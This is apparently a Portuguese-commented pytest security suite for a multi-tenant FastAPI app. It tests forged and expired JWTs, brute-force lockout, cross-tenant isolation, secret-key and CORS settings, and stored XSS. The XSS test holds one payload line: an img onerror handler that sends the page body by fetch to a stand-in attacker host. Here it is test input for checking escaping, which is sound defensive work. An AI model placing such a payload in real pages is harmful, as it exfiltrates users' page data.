"""A camada de segurança, exercitada (§31, §33).

Cada teste aqui corresponde a uma forma concreta de invadir o sistema. Não são
testes de "a função existe": são a tentativa de ataque, e a prova de que ela
falha.
"""
from __future__ import annotations

import datetime as dt
import os

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from app.core.config import CHAVE_DE_DESENVOLVIMENTO, Settings, get_settings
from app.core.db import Base, get_db
from app.core.security import criar_token, hash_senha, conferir_senha
from app.main import app
from app.models import Base as ModelosBase  # noqa: F401
from app.seeds.carga import popular


@pytest.fixture
def cliente(tmp_path):
    engine = create_engine(f"sqlite+pysqlite:///{tmp_path / 'seg.db'}",
                           connect_args={"check_same_thread": False})
    Base.metadata.create_all(engine)
    Sessao = sessionmaker(bind=engine, autoflush=False, autocommit=False)
    with Sessao() as db:
        popular(db, com_demonstracao=True)

    def _db():
        db = Sessao()
        try:
            yield db
        finally:
            db.close()

    app.dependency_overrides[get_db] = _db
    with TestClient(app) as c:
        yield c
    app.dependency_overrides.clear()


def entrar(cliente, senha="terceiro360"):
    return cliente.post(
        "/api/v1/auth/login",
        data={"username": "admin@demo.terceiro360.local", "password": senha},
    )


# ---------------------------------------------------------------- sessão


def test_api_nao_responde_sem_token(cliente):
    for caminho in ("/api/v1/entidades", "/api/v1/pendencias", "/api/v1/normativo/fontes"):
        assert cliente.get(caminho).status_code == 401, caminho


def test_token_forjado_com_outra_chave_e_recusado(cliente):
    """O ataque óbvio: assinar o próprio token."""
    from jose import jwt

    usuario = entrar(cliente).json()
    del usuario
    falso = jwt.encode(
        {"sub": "00000000-0000-0000-0000-000000000001",
         "cli": "00000000-0000-0000-0000-000000000002",
         "exp": dt.datetime.now(dt.timezone.utc) + dt.timedelta(hours=1)},
        "chave-do-atacante",
        algorithm="HS256",
    )
    r = cliente.get("/api/v1/entidades", headers={"Authorization": f"Bearer {falso}"})
    assert r.status_code == 401


def test_token_expirado_nao_serve(cliente):
    from jose import jwt
    from app.core.config import settings

    vencido = jwt.encode(
        {"sub": "00000000-0000-0000-0000-000000000001",
         "cli": "00000000-0000-0000-0000-000000000002",
         "exp": dt.datetime.now(dt.timezone.utc) - dt.timedelta(minutes=1)},
        settings.secret_key,
        algorithm="HS256",
    )
    assert cliente.get(
        "/api/v1/entidades", headers={"Authorization": f"Bearer {vencido}"}
    ).status_code == 401


def test_senha_nao_e_guardada_nem_reversivel():
    hash_ = hash_senha("terceiro360")
    assert "terceiro360" not in hash_
    assert hash_.startswith("$2")           # bcrypt
    assert conferir_senha("terceiro360", hash_)
    assert not conferir_senha("terceiro36", hash_)
    # Sal aleatório: dois usuários com a mesma senha têm hashes diferentes.
    assert hash_ != hash_senha("terceiro360")


# ------------------------------------------------------------ força bruta


def test_forca_bruta_e_travada_apos_cinco_tentativas(cliente):
    for _ in range(5):
        assert entrar(cliente, "errada").status_code == 401

    bloqueado = entrar(cliente, "errada")
    assert bloqueado.status_code == 429
    assert "Aguarde" in bloqueado.json()["detail"]

    # E o bloqueio vale mesmo com a senha certa: quem está travado está travado.
    assert entrar(cliente).status_code == 429


def test_tentativa_negada_fica_registrada(cliente):
    from sqlalchemy import select
    from app.modules.compliance.models import LogAcesso

    entrar(cliente, "errada")
    db = next(app.dependency_overrides[get_db]())
    negadas = db.scalars(
        select(LogAcesso).where(LogAcesso.resultado == "NEGADO")
    ).all()
    assert negadas, "tentativa de invasão sem rastro é meio caminho andado"
    assert negadas[0].acao == "LOGIN"


# ----------------------------------------------- isolamento entre clientes


def test_um_cliente_nao_alcanca_a_entidade_de_outro(cliente):
    """O risco central do multi-inquilino: vazar dado entre escritórios.

    O intruso aqui não é um curioso sem permissão — é **administrador pleno do
    próprio escritório**. É o cenário que importa: permissão total não pode
    valer um centímetro além das entidades do seu cliente.
    """
    from sqlalchemy import select
    from app.modules.identity.models import Cliente, Perfil, Usuario, UsuarioPerfil
    from app.core.security import hash_senha as _hash

    db = next(app.dependency_overrides[get_db]())
    entidade_alheia = cliente.get(
        "/api/v1/entidades", headers=_auth(cliente)
    ).json()[0]["id"]

    intruso_cliente = Cliente(nome="Escritório Intruso", documento="00.000.000/0001-00")
    db.add(intruso_cliente)
    db.flush()
    intruso = Usuario(
        cliente_id=intruso_cliente.id, nome="Intruso",
        email="intruso@exemplo.local", senha_hash=_hash("intruso123"), ativo=True,
    )
    db.add(intruso)
    db.flush()
    administrador = db.scalar(select(Perfil).where(Perfil.codigo == "ADMINISTRADOR"))
    db.add(UsuarioPerfil(usuario_id=intruso.id, perfil_id=administrador.id))
    db.commit()

    token = cliente.post(
        "/api/v1/auth/login",
        data={"username": "intruso@exemplo.local", "password": "intruso123"},
    ).json()["access_token"]
    cabecalho = {"Authorization": f"Bearer {token}"}

    # Não vê nada na listagem…
    assert cliente.get("/api/v1/entidades", headers=cabecalho).json() == []
    # …e nem pedindo o identificador direto, que é o que um atacante faria.
    for caminho in (
        f"/api/v1/entidades/{entidade_alheia}",
        f"/api/v1/entidades/{entidade_alheia}/documentos",
        f"/api/v1/entidades/{entidade_alheia}/associados",
        f"/api/v1/entidades/{entidade_alheia}/protocolos",
    ):
        assert cliente.get(caminho, headers=cabecalho).status_code == 404, caminho


def _auth(cliente):
    return {"Authorization": f"Bearer {entrar(cliente).json()['access_token']}"}


# ------------------------------------------------------------------- XSS


def test_dado_do_usuario_nao_vira_html_no_documento():
    """XSS armazenado: o texto do documento é renderizado como HTML na tela."""
    from app.engines.templates.motor import MARCADOR_LACUNA, marcar_lacunas_html

    ataque = '<img src=x onerror="fetch(\'https://atacante/\'+document.body.innerHTML)">'
    saida = marcar_lacunas_html(f"Razão social: {ataque} {MARCADOR_LACUNA}")

    assert "<img" not in saida
    assert "&lt;img" in saida
    # E o realce da lacuna continua funcionando.
    assert '<mark class="lacuna">' in saida


# ------------------------------------------------- configuração perigosa


def test_producao_nao_sobe_com_a_chave_do_repositorio(monkeypatch):
    """A falha mais cara possível: subir assinando sessão com chave pública."""
    monkeypatch.setenv("T360_ENVIRONMENT", "production")
    monkeypatch.delenv("T360_SECRET_KEY", raising=False)
    monkeypatch.setenv("T360_DEBUG", "false")
    get_settings.cache_clear()
    with pytest.raises(RuntimeError, match="T360_SECRET_KEY"):
        get_settings()
    get_settings.cache_clear()


def test_producao_recusa_chave_curta_e_debug_ligado(monkeypatch):
    monkeypatch.setenv("T360_ENVIRONMENT", "production")
    monkeypatch.setenv("T360_SECRET_KEY", "curta")
    monkeypatch.setenv("T360_DEBUG", "false")
    get_settings.cache_clear()
    with pytest.raises(RuntimeError, match="curta demais"):
        get_settings()

    monkeypatch.setenv("T360_SECRET_KEY", "k" * 64)
    monkeypatch.setenv("T360_DEBUG", "true")
    get_settings.cache_clear()
    with pytest.raises(RuntimeError, match="T360_DEBUG"):
        get_settings()
    get_settings.cache_clear()


def test_cors_nao_libera_qualquer_origem():
    """Com credenciais, "*" deixaria qualquer site agir como o usuário logado."""
    origens = Settings().cors_origens
    assert "*" not in origens
    assert all(o.startswith("http://localhost") or o.startswith("https://")
               or o.startswith("http://127.0.0.1") for o in origens)
